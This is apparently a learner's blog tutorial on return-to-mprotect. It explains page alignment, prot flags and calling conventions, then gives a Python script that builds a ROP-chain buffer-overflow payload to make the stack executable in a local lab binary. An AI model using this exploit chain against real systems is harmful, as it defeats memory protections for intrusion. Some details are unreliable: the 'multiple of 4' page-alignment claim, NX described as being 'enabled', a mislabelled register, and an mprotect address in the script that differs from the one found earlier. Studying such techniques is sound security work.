# Return to mprotect (defeating NX)

Hello everyone!

I’ve been exploring binary exploitation and found **Return-Oriented Programming (ROP)**  really fascinating. In this post, I’ll share what I’ve learned so far. Since I’m still learning, if you spot any mistakes or have better ideas, please let me know!

Before we dive in, make sure you’re familiar with **buffer overflows** and **ret2libc** attacks. If you’re already comfortable with those, great let’s get started! Otherwise, I recommend checking those topics first and then coming back here.

‍

The main drawback of **ret2libc** is that we are restricted to functions available  in **libc**, meaning we are entirely dependent on its functionality.

But what if libc doesn't contain what we need?

 In such cases, we aim to **mark the stack as executable** by enabling the **NX (No eXecute) bit**. This is necessary because we still need to execute shellcode on the stack.

To achieve this, we use **Return-Oriented Programming (ROP)** . By crafting a **ROP chain**, we can manipulate program execution to enable the **execute (X) permission** on the stack.

‍

![image](assets/image-20250328173124-y32czs6.png)

The mprotect() system call is a Linux  function used to change the access protections of a memory region.

We will use the trechnique “return-to-mprotect” to modify a memory region's permissions (typically marking it as executable) so that shellcode or injected code can run.  
  

**Function Signature:**

```c
int mprotect(void *addr, size_t len, int prot);
```

but before that lets understand that how the memory in a computer is divided.

so the memory is divided into fixed-size chunks called "pages." Most systems use pages that are 4 KB (4096 bytes) in size.

When you change the permissions of a region of memory using the `mprotect()`​ function, the starting address (the first byte) of that region must line up exactly with the beginning of one of these pages.

***it simply means that the base/starting address of the memory region should be the multiple of 4 (4096 bytes).***

‍

![image](assets/image-20250328171839-6mn9dwq.png)

so 4096 and 8192 are the multiple of 4.

![image](assets/image-20250328181020-dg9yvin.png)

![image](assets/image-20250328181113-w99jony.png)

Now lets see the stack address if its page-alligned

![image](assets/image-20250328171510-n5weoox.png)

```text
GDB prints 0, the address 0x7ffffffde000 is the multiple of 4 therefore its page-aligned
```

‍

lets look at the function arguments now:

```c
int mprotect(void *addr, size_t len, int prot);
```

‍

### <span data-type="text" style="font-size: 19px;">void *addr (Starting Address)</span>

This is the pointer to the beginning of the memory region whose permissions you want to change.(for our purpose this is the base address of the stack)

**size_t len**  
This specifies the total number of bytes (starting from the given address) that will have its protection changed. In practice, you'll want to choose a length that covers complete memory pages (e.g., 4096 bytes per page)

**int prot**

**prot** is an integer that tells the system what type of access you want to allow for a block of memoryThey are combined using bitwise OR (for example, `PROT_READ | PROT_WRITE | PROT_EXEC`​).

‍

**Bitwise OR Operator (**​ **​`|`​** ​ **):**   
This operator compares each bit of two numbers. If **at least one bit** in a given position is 1, the result for that bit position is 1. Otherwise, it's 0

lets consider two 4-bit numbers for simplicity:

* **A**  **=**  **5** which in binary is **0101**
* **B**  **=**  **3** which in binary is **0011**

```c
    A:  0 1 0 1
    B:  0 0 1 1
         ------
A | B:  0 1 1 1

```

‍

![image](assets/image-20250326112635-rp27d8d.png)

```c
PROT_READ = 1, which is 0b001 in binary.
PROT_WRITE = 2, which is 0b010 in binary.
PROT_EXEC = 4, which is  0b100 in binary.
```

‍

```c
1 | 2 | 4 = 7
```

‍

```c
   PROT_READ   :   0 0 1   (1 in decimal)
   PROT_WRITE  :   0 1 0   (2 in decimal)
   -----------------
   Intermediate:   0 1 1   (011 = 3 in decimal)
   PROT_EXEC   :   1 0 0   (4 in decimal)
   -----------------
   Final Result:   1 1 1   (111 = 7 in decimal)

```

so if we specify 7  as prot value then this means we 're allowing the memory to be read, written, and executed. **(rwx)**

‍

lets Assume:

* **Page Size** \= 4 KB (4096 bytes)
* **addr** \= 0x1000 (which is page-aligned)
* **len** \= 8192 bytes (which covers two pages)

* It starts at **0x1000**.
* It changes the protections for **8192 bytes**

So here you're ensuring that both the first and the second page, starting at address 0x1000, are updated with the new access rights.

‍

**Initial Memory Layout**

```c
         0x1000
           │
           ▼
   +-----------------+  <-- Page 1 (4096 bytes)
   |                 |  PROT_READ | PROT_WRITE
   +-----------------+
           │
         0x2000  <-- End of Page 1, Start of Page 2
           │
           ▼
   +-----------------+  <-- Page 2 (4096 bytes)
   |                 |  PROT_READ | PROT_WRITE
   +-----------------+
           │
         0x3000  <-- End of Page 2

```

Initially, the pages might have, read and write permissions.

‍

### After Calling mprotect()

After you call **mprotect(addr, len,**  **PROT_READ | PROT_WRITE | PROT_EXEC** **)** , the protections for both pages are updated:

```c
         0x1000
           │
           ▼
   +-----------------+  <-- Page 1 (4096 bytes)
   |                 |  PROT_READ | PROT_WRITE | PROT_EXEC
   +-----------------+
           │
         0x2000  <-- End of Page 1, Start of Page 2
           │
           ▼
   +-----------------+  <-- Page 2 (4096 bytes)
   |                 |  PROT_READ | PROT_WRITE | PROT_EXEC
   +-----------------+
           │
         0x3000  <-- End of Page 2

```

The **new protection** settings (read, write, execute) are now applied to both pages.

‍

Now time to get in action!

We will use Ropper – A Tool for Finding ROP Gadgets ([https://github.com/sashs/Ropper](https://github.com/sashs/Ropper))

We need to follow some guidelines for creating ROP chains

```c

 Combine multiple gadgets to disable NX (Non-Executable) protections and execute shellcode.



 Each gadget must correctly pass control to the next gadget using a RET instruction.



 Only use gadgets that terminate with RET, as these are necessary for chaining.


 Ensure that all required parameters are placed on the stack or relevant registers before execution.



 Reserve enough space on the stack for data storage and stack pointer adjustments.


 If a gadget has unnecessary instructions, use padding (filling the stack with appropriate values) to avoid disrupting execution.
```

​​

So lets see the function

```c
int mprotect(void *addr, size_t len, int prot);

```

So far, we’ve determined that:

* **First Argument:**  The base address of the stack (i.e., where the memory region starts).
* **Second Argument:**  The length, or the total number of bytes from that base address, over which the new protection settings will be applied.
* **Third Argument (7):**  This value sets the permissions to read, write, and execute (RWX), making the stack executable.

‍

So lets talk about calling conventions , when we call a function how to we specify the arguments? f**or linux x86_64**

* rdi -> first argument
* rsi -> second argument
* rdx -> third argument
* rcx -> fourth argument
* r8 -> firfth argument
* r9 -> sixth argument

‍

mprotect takes 3 arguments  so the following registers are going to be used.

* rdi -> first argument --- (base address of the stack)
* rsi -> second argument --- (length)
* rdx -> third argument --- (prot value = 7)

‍

**Gadgets which we need:**

```1
rdi -- pop rdi; ret

rsi -- pop rsi; ret

rdx -- pop rdx; ret
```

‍

![image](assets/image-20250326113856-x5s96kh.png)

![image](assets/image-20250326114017-d4idfi2.png)

```1
0x000000000002a205: pop rdi; ret; 
```

‍

![image](assets/image-20250326114110-cpa5l54.png)

```1
0x000000000002bb39: pop rsi; ret; 

```

‍

![image](assets/image-20250326114210-iiyjgbq.png)

```1
0x000000000010d37d: pop rdx; ret;
```

‍

here we go we have our gadgets ready now:

```1
0x000000000002a205: pop rdi; ret; -- base address of stack
0x000000000002bb39: pop rsi; ret; -- length 
0x000000000010d37d: pop rdx; ret; -- prot value (7)
```

‍

**The next step is to find out the base address of stack and address of mprotect().**

**disable aslr:**

![image](assets/image-20250326114849-cnenvmf.png)

‍

```1
pwndbg>  vmmap
```

‍

![image](assets/image-20250326115006-s09x5my.png)

```1
base address of the stack : 0x7ffffffde000
protection rw-
```

‍

![image](assets/image-20250326115222-kdfq7wn.png)

```1
address of mprotect in libc: 0x7ffff7feaba0
```

‍

So we have almost everything ready now.

```1
            0x7ffff7dac000 -- libc_base address
rdi --      0x7ffffffde000 -- base address of stack
rdi --      0x7ffff7feaba0 -- address of mprotect in libc
rdx --      (7)            -- prot value 
            0x7ffff7dee280 -- address of exit() 
```

‍

Here we go:

```python
import struct

libc_base = 0x7ffff7dac000
payload = b"A" * 264                                        # Overflow with 264 'A' characters
payload += struct.pack("<Q",libc_base + 0x0000000000028635) # ret address for stack allignment

payload += struct.pack("<Q",libc_base + 0x000000000002a205) # pop rdi; ret
payload += struct.pack("<Q", 0x7ffffffde000)                # base address of stack
payload += struct.pack("<Q",libc_base + 0x000000000002bb39) # pop rsi; ret
payload += struct.pack("<Q", 0x0101010)                     # length
payload += struct.pack("<Q",libc_base + 0x000000000010d37d) # pop rdx; ret
payload += struct.pack("<Q", 0x7)                           # prot value: 7
payload += struct.pack("<Q", 0x7ffff7eb9200)                # address of mprotect
payload += struct.pack("<Q", 0x7ffff7dee280)                # address of exit function


# print(payload)
with open("input.txt", "wb") as f:
    f.write(payload)

print("Payload written to input.txt. Run with: `./vulnerable_program < input.txt`")


```

‍

![image](assets/image-20250328232254-n3z0emy.png)

![image](assets/image-20250328232947-t1sx40l.png)

![image](assets/image-20250328234004-gp3v4qh.png)

![image](assets/image-20250328234912-nvaxjot.png)

![image](assets/image-20250328235500-ypfr86i.png)

![image](assets/image-20250329001312-74eci4u.png)

![image](assets/image-20250329001504-2st3mbr.png)

Finally , The stack is executable now.
